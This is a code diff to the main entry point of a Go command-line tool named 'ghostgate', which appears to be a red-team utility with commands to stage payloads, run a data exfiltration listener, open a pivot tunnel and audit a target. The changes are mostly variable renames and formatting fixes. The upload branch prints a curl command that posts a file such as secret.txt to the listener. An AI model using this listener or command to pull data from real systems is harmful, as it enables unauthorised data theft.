@@ -20,8 +20,8 @@ func main(){
 		// Initalises the configuration file
 		if err := config.InitializeConfig(); err != nil {
 			// Logs an error
-            log.Fatalf("Failed to initialize: %v", err)
-        }
+			log.Fatalf("Failed to initialize: %v", err)
+		}
 		// Returns nothing
 		return
 	}
@@ -31,9 +31,9 @@ func main(){
 
 	// CHecks for an error
 	if err != nil {
-        log.Printf("[!] Warning: Could not load config file, using defaults: %v", err)
-        // Even if err occurs, cfg might have Viper defaults if handled in LoadConfig
-    }
+		log.Printf("[!] Warning: Could not load config file, using defaults: %v", err)
+		// Even if err occurs, cfg might have Viper defaults if handled in LoadConfig
+	}
 
 	// ---------------------------------------------------------
 	// Flag Sets Definitions (Standardized Names & Flags)
@@ -60,11 +60,6 @@ func main(){
 	auditCmd := flag.NewFlagSet("audit", flag.ExitOnError)
 	auditTarget := auditCmd.String("u", "", "Target URL/endpoint to perform the audit against")
 
-	// Check if the user provided a subcommand
-	if len(os.Args) < 2 {
-		fmt.Println("Usage: ghostgate <command> [flags]\n\nAvailable commands:\n  init      Initialize configuration\n  stage     Host a payload staging directory\n  upload    Start a data exfiltration listener\n  tunnel    Start a local pivot/tunnel proxy\n  audit     Run a configuration audit against a target")
-
-
 	// Checks if the user has provided a subcommand
 	if len(os.Args) < 2 {
 		// Outputs an invaild command
@@ -77,10 +72,10 @@ func main(){
 	switch os.Args[1] {
 		case "stage":
 			// Parse the flags starting from the 3rd argument (index 2)
-			stageDirectoryOption.Parse(os.Args[2:])
+			stageCmd.Parse(os.Args[2:])
 
 			// Cleans the file path
-			cleanPort := sanitation.CleanPort(*stageDirectoryPort)
+			cleanPort := sanitation.CleanPort(*stagePort)
 
 			// Stores the result of the port validation
 			portNumberValid := validation.ValidatePort(cleanPort)
@@ -88,11 +83,11 @@ func main(){
 			// Checks if the number is not valid
 			if !portNumberValid {
 				// Logs the error
-				log.Fatalf("Invalid port: %s", *stageDirectoryPort)
+				log.Fatalf("Invalid port: %s", *stagePort)
 			}
 
 			// Sanitises the file path
-			cleanPath := sanitation.CleanFilePath(*stageDirectoryDir)
+			cleanPath := sanitation.CleanFilePath(*stageDir)
 
 			// Stores the result and cleaned version of the validate port
 			cleanDir, dirValid := validation.ValidateFilePath(cleanPath)
@@ -100,25 +95,25 @@ func main(){
 			// Checks if the directory is not valid
 			if !dirValid {
 				// Logs the error
-				log.Fatalf("Invalid directory: %s", *stageDirectoryDir)
+				log.Fatalf("Invalid directory: %s", *stageDir)
 			}
 
-			cleanSource, sourceValid := validation.ValidateFilePath(*stageDirectorySource)
+			cleanSource, sourceValid := validation.ValidateFilePath(*stageSource)
 
 			// Checks if the directory is not valid
 			if !sourceValid {
 				// Logs the error
-				log.Fatalf("Invalid directory: %s", *stageDirectorySource)
+				log.Fatalf("Invalid directory: %s", *stageSource)
 			}
 
 			// Passes the flags into the function
-			essentail.StagePayloadDirectory(*stageDirectoryPort, cleanDir, cleanSource)
+			essentail.StagePayloadDirectory(*stagePort, cleanDir, cleanSource)
 		case "upload":
 			// Parse the flags
-			uploadFilesOption.Parse(os.Args[2:])
+			uploadCmd.Parse(os.Args[2:])
 
 			// Cleans the port number
-			cleanPort := sanitation.CleanPort(*uploadFilesPort)
+			cleanPort := sanitation.CleanPort(*uploadPort)
 
 			// Stores the result of the port validation
 			portNumberValid := validation.ValidatePort(cleanPort)
@@ -126,11 +121,11 @@ func main(){
 			// Checks if the number is not valid
 			if !portNumberValid {
 				// Logs the error
-				log.Fatalf("Invalid port: %s", *uploadFilesPort)
+				log.Fatalf("Invalid port: %s", *uploadPort)
 			}
 
 			// Checks if the url is valid 
-			_, err := validation.ValidateURL(*uploadFilesUrlPath)
+			_, err := validation.ValidateURL(*uploadPath)
 
 			// Checks if there is errors
 			if err != nil{
@@ -138,19 +133,19 @@ func main(){
 			} 
 
 			// Handles the function
-			http.HandleFunc(*uploadFilesUrlPath, essentail.UploadHandler(*uploadFilesExfilPath))
+			http.HandleFunc(*uploadPath, essentail.UploadHandler(*uploadDest))
 
 			// Prints information about the path
-			fmt.Printf("[*] Data Exfiltration Listener active on port %s", *uploadFilesPort)
-			fmt.Printf("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://%s:%s/upload\n",networking.GetOutboundIP(), *uploadFilesPort)
+			fmt.Printf("[*] Data Exfiltration Listener active on port %s", *uploadPort)
+			fmt.Printf("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://%s:%s%s\n", networking.GetOutboundIP(), *uploadPort, *uploadPath)
 			
 			// Listens and serves the server
-			if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
+			if err := http.ListenAndServe(":" + *uploadPort, nil); err != nil {
 				log.Fatal(err)
 			}
 		case "tunnel":
 			// Parses the flags
-			tunnelOption.Parse(os.Args[2:])
+			tunnelCmd.Parse(os.Args[2:])
 
 			// Checks if the url is valid 
 			_, err := validation.ValidateURL(*tunnelTarget)
@@ -186,7 +181,7 @@ func main(){
 		
 		case "audit":
 			// Parses the flag
-			auditOption.Parse(os.Args[2:])
+			auditCmd.Parse(os.Args[2:])
 
 			// Checks if the url is valid 
 			_, err := validation.ValidateURL(*auditTarget)
